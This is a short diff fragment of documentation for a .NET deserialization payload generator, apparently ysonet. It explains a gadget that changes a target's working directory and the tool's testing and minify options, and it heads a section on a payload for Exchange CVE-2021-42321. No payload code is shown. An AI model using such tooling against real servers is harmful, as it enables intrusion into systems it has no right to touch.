+- The other two carriers for the same sink, `System.Environment.CurrentDirectory` and
+  `Microsoft.VisualBasic.FileIO.FileSystem.CurrentDirectory`, are STATIC and cannot be
+  named by any of these serializers, which is why the proxy is the one that ships.
+- `-t` deserializes here, so it moves the ysonet process, and then puts the directory back
+  so the rest of the run is unaffected. Run with `--debugmode` to see the before and after.
+- If `--minify` would rewrite your directory (the XML minifier trims trailing whitespace
+  from a text node), generation is refused rather than shipping a payload that moves the
+  target somewhere else. Drop `--minify` or use a path with no trailing space.
 
 ### Generate a minified BinaryFormatter payload for Exchange CVE-2021-42321
 
